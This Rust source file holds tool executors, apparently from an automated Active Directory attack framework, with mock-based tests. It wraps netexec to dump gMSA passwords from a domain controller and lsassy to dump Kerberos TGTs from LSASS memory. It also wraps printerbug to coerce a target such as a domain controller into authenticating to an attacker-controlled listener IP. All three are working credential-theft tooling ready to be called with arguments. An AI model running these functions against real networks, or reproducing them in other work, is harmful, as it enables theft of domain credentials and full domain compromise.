//! gMSA and unconstrained delegation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Dump gMSA passwords using netexec's gmsa module.
///
/// Required args: `dc_ip`, `username`, `password`, `domain`
pub async fn gmsa_dump_passwords(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let creds = credentials::netexec_creds(username, password, None, domain);

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(dc_ip)
        .args(creds)
        .args(["-M", "gmsa"])
        .timeout_secs(120)
        .execute()
        .await
}

/// Dump TGTs from memory on an unconstrained delegation host using lsassy.
///
/// Required args: `domain`, `username`, `password`, `target_host`
pub async fn unconstrained_tgt_dump(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_host = required_str(args, "target_host")?;

    CommandBuilder::new("lsassy")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .arg(target_host)
        .args(["-m", "direct"])
        .timeout_secs(180)
        .execute()
        .await
}

/// Coerce authentication from a remote host using printerbug.py (SpoolService).
///
/// Required args: `domain`, `username`, `password`, `coerce_from`, `listener_ip`
pub async fn unconstrained_coerce_and_capture(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let coerce_from = required_str(args, "coerce_from")?;
    let listener_ip = required_str(args, "listener_ip")?;

    let creds = format!("{domain}/{username}:{password}@{coerce_from}");

    CommandBuilder::new("printerbug")
        .arg(creds)
        .arg(listener_ip)
        .timeout_secs(60)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    // --- gmsa_dump_passwords ---

    #[test]
    fn gmsa_dump_passwords_requires_dc_ip() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn gmsa_dump_passwords_username_optional() {
        let args = json!({
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "username").is_none());
    }

    #[test]
    fn gmsa_dump_passwords_password_optional() {
        let args = json!({
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "password").is_none());
    }

    #[test]
    fn gmsa_dump_passwords_domain_optional() {
        let args = json!({
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "domain").is_none());
    }

    #[test]
    fn gmsa_dump_passwords_all_optional_present() {
        let args = json!({
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "password": "P@ssw0rd!",
            "domain": "contoso.local"
        });
        assert_eq!(optional_str(&args, "username"), Some("admin"));
        assert_eq!(optional_str(&args, "password"), Some("P@ssw0rd!"));
        assert_eq!(optional_str(&args, "domain"), Some("contoso.local"));
    }

    // --- unconstrained_tgt_dump ---

    #[test]
    fn unconstrained_tgt_dump_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_host": "web01.contoso.local"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn unconstrained_tgt_dump_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target_host": "web01.contoso.local"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn unconstrained_tgt_dump_missing_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "target_host": "web01.contoso.local"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn unconstrained_tgt_dump_missing_target_host() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "target_host").is_err());
    }

    #[test]
    fn unconstrained_tgt_dump_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_host": "web01.contoso.local"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "username").unwrap(), "admin");
        assert_eq!(required_str(&args, "password").unwrap(), "P@ssw0rd!");
        assert_eq!(
            required_str(&args, "target_host").unwrap(),
            "web01.contoso.local"
        );
    }

    // --- unconstrained_coerce_and_capture ---

    #[test]
    fn unconstrained_coerce_missing_coerce_from() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "listener_ip": "192.168.58.5"
        });
        assert!(required_str(&args, "coerce_from").is_err());
    }

    #[test]
    fn unconstrained_coerce_missing_listener_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "coerce_from": "dc01.contoso.local"
        });
        assert!(required_str(&args, "listener_ip").is_err());
    }

    #[test]
    fn unconstrained_coerce_creds_format() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "coerce_from": "dc01.contoso.local",
            "listener_ip": "192.168.58.5"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = required_str(&args, "password").unwrap();
        let coerce_from = required_str(&args, "coerce_from").unwrap();
        let creds = format!("{domain}/{username}:{password}@{coerce_from}");
        assert_eq!(creds, "contoso.local/admin:P@ssw0rd!@dc01.contoso.local");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn gmsa_dump_passwords_executes() {
        mock::push(mock::success());
        let args = json!({
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "password": "P@ssw0rd!",
            "domain": "contoso.local"
        });
        assert!(gmsa_dump_passwords(&args).await.is_ok());
    }

    #[tokio::test]
    async fn gmsa_dump_passwords_minimal_args() {
        mock::push(mock::success());
        let args = json!({"dc_ip": "192.168.58.10"});
        assert!(gmsa_dump_passwords(&args).await.is_ok());
    }

    #[tokio::test]
    async fn unconstrained_tgt_dump_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_host": "web01.contoso.local"
        });
        assert!(unconstrained_tgt_dump(&args).await.is_ok());
    }

    #[tokio::test]
    async fn unconstrained_coerce_and_capture_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "coerce_from": "dc01.contoso.local",
            "listener_ip": "192.168.58.5"
        });
        assert!(unconstrained_coerce_and_capture(&args).await.is_ok());
    }
}
